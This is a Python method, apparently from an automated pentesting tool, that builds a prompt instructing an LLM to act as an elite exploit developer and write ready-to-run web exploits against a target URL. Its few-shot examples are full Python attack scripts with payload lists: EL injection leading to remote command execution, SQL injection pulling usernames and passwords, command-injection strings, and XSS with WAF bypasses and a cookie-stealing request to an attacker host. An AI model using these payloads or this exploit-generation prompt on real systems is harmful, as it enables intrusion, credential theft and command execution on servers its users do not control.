    def _build_web_logic_prompt(self, context_dict):
        """
        STATE-OF-THE-ART Exploit Generation Prompt
        Incorporates: Chain-of-Thought, Few-Shot Learning, Multi-Vector Payloads, WAF Bypass
        Based on 2024 research on LLM prompting and advanced exploitation techniques
        """
        language = context_dict.get("language", "Java/Python")
        vuln_type = context_dict.get("vulnerability_type", "Unknown")
        cwe = context_dict.get("cwe", "Unknown")
        file_path = context_dict.get("file_path", "Unknown")
        vulnerable_code = context_dict.get("vulnerable_chunk", "No code provided.")
        
        target_url = self.default_target or "http://localhost:8080"
        
        prompt = f"""Below is an instruction that describes a task. Write a response that appropriately completes the request.

### Instruction:
You are an ELITE penetration tester and exploit developer with 20+ years of offensive security experience. You specialize in creating production-ready, multi-vector exploits that demonstrate real-world attack techniques.

═══════════════════════════════════════════════════════════════════════════════
⚠️  CRITICAL: CWE-TO-PAYLOAD MAPPING (STRICTLY ENFORCE)
═══════════════════════════════════════════════════════════════════════════════

**CWE-917 (EL Injection)**:
├─ Primary: `${{"...".__class__.forName("java.lang.Runtime").getRuntime().exec("cmd")}}`
├─ Detection: `${{7*7}}` (should return 49)
├─ WAF Bypass: Dynamic string construction without quotes
└─ ❌ NEVER use path traversal (`../`) for EL Injection

**CWE-89 (SQL Injection)**:
├─ Union-based: `' UNION SELECT NULL, username, password FROM users--`
├─ Blind: `' AND IF(SUBSTRING(DB_NAME(),1,1)='A', SLEEP(5), 0)--`
├─ Boolean: `' AND 1=1--` vs `' AND 1=2--`
└─ ❌ NEVER use EL syntax (`${{}}`) for SQL

**CWE-79 (XSS)**:
├─ Reflected: `<script>alert(document.cookie)</script>`
├─ DOM: `<img src=x onerror=alert(1)>`
├─ WAF Bypass: `<scr<script>ipt>alert(1)</script>`
└─ ❌ NEVER use SQL syntax for XSS

**CWE-78 (Command Injection)**:
├─ Basic: `; whoami`, `| id`, `&& ls`
├─ Advanced: `\`whoami\``, `$(whoami)`
└─ Blind: `; sleep 5`

═══════════════════════════════════════════════════════════════════════════════
📚 FEW-SHOT EXAMPLES (STUDY THESE CAREFULLY)
═══════════════════════════════════════════════════════════════════════════════

**EXAMPLE 1: EL INJECTION (CWE-917) - The Gold Standard**

Vulnerable Code:
```java
public String processExpression(String userExpr) {{
    ExpressionFactory factory = ExpressionFactory.newInstance();
    ValueExpression ve = factory.createValueExpression(elContext, userExpr, String.class);
    return (String) ve.getValue(elContext);  // VULNERABLE
}}
```

PERFECT Exploit (Multi-Vector):
```python
import requests

target = "{target_url}"

# ═══ MULTI-VECTOR EL INJECTION PAYLOADS ═══
payloads = {{
    "detection": [
        "${{7*7}}",  # Should return "49"
        "${{1+1}}",  
    ],
    "information_gathering": [
        "${{applicationScope}}",
        "${{header}}",
        '${{\"\".__class__.forName(\"java.lang.System\").getProperty(\"user.name\")}}',
        '${{\"\".__class__.forName(\"java.lang.System\").getProperty(\"os.name\")}}',
    ],
    "rce": [
        '${{\"\".__class__.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")}}',
        '${{\"\".__class__.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"id\")}}',
    ]
}}

print("[*] Starting EL Injection exploitation...")

for payload in payloads["detection"]:
    response = requests.post(target, json={{"expression": payload}}, timeout=5)
    print(f"[+] {{payload}}: {{response.text[:100]}}")
    if "49" in response.text or "2" in response.text:
        print("    [!] CONFIRMED\\n")

for payload in payloads["rce"]:
    response = requests.post(target, json={{"expression": payload}}, timeout=10)
    print(f"[+] RCE: {{payload[:60]}}...")
    if response.status_code == 200:
        print("    [!] EXECUTED\\n")

print("[*] Complete.")
```

---

**EXAMPLE 2: SQL INJECTION (CWE-89)**

Vulnerable Code:
```java
String query = "SELECT * FROM users WHERE username = '" + username + "'";
```

PERFECT Exploit:
```python
import requests
import time

target = "{target_url}"

payloads = {{
    "detection": ["admin' OR '1'='1", "admin'--"],
    "union_based": [
        "' UNION SELECT NULL, username, password FROM users--",
        "' UNION SELECT database(), version(), NULL--",
    ],
    "time_based": [
        "' AND IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)--",
    ]
}}

print("[*] SQL Injection exploitation...")

for payload in payloads["detection"]:
    response = requests.get(target, params={{"username": payload}})
    print(f"[+] {{payload}}: Status {{response.status_code}}")

for payload in payloads["union_based"]:
    response = requests.get(target, params={{"username": payload}})
    print(f"[+] {{payload[:50]}}: {{response.text[:150]}}")

print("[*] Complete.")
```

---

**EXAMPLE 3: XSS (CWE-79)**

Vulnerable Code:
```java
model.addAttribute("query", query);  // No encoding
```

PERFECT Exploit:
```python
import requests

target = "{target_url}"

payloads = {{
    "detection": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"],
    "cookie_stealing": ["<script>fetch('http://attacker.com/?c='+document.cookie)</script>"],
    "waf_bypass": ["<scr<script>ipt>alert(1)</script>", "<svg/onload=alert(1)>"]
}}

print("[*] XSS exploitation...")

for category, payload_list in payloads.items():
    print(f"\\n[{{category}}]")
    for payload in payload_list:
        response = requests.get(target, params={{"query": payload}})
        if payload in response.text:
            print(f"[+] REFLECTED: {{payload[:50]}}")

print("[*] Complete.")
```

═══════════════════════════════════════════════════════════════════════════════
🎯 YOUR MISSION
═══════════════════════════════════════════════════════════════════════════════

**Context:**
- Language: {language}
- Vulnerability: {vuln_type}
- CWE: {cwe}
- File: {file_path}
- Target: {target_url}

**Vulnerable Code:**
```
{vulnerable_code[:1500]}
```

═══════════════════════════════════════════════════════════════════════════════
🧠 MANDATORY ANALYSIS (THINK BEFORE CODING)
═══════════════════════════════════════════════════════════════════════════════

**STEP 1: CWE Analysis**
- What is CWE {cwe}?
- What payloads match this CWE?

**STEP 2: Code Analysis**
- WHERE does input enter?
- WHAT method processes it?

**STEP 3: Payload Selection**
- For CWE-917 → Use `${{}}` 
- For CWE-89 → Use SQL syntax
- For CWE-79 → Use HTML/JS
- For CWE-78 → Use shell operators

**STEP 4: Multi-Vector Strategy**
- 3-5 detection payloads
- 3-5 exploitation payloads

═══════════════════════════════════════════════════════════════════════════════
✅ OUTPUT FORMAT
═══════════════════════════════════════════════════════════════════════════════

### Response:
```python
import requests

target = "{target_url}"

# Multi-vector payloads
payloads = {{
    "detection": [
        # Safe test payloads (3-5)
    ],
    "exploitation": [
        # Critical payloads (3-5)
    ]
}}

print("[*] Starting exploitation...")

for payload in payloads["detection"]:
    response = requests.post(target, json={{"param": payload}}, timeout=5)
    print(f"[+] {{payload}}: {{response.text[:100]}}")

for payload in payloads["exploitation"]:
    response = requests.post(target, json={{"param": payload}}, timeout=10)
    print(f"[+] {{payload[:60]}}: Status {{response.status_code}}")

print("[*] Complete.")
```

**REMINDERS**:
- ✅ USE `requests` (NOT pwntools)
- ✅ MATCH payloads to CWE {cwe}
- ✅ INCLUDE 3-5 payloads per phase
- ✅ ADD error handling
- ✅ USE exact parameter names

### Response:
```python
"""
        return prompt
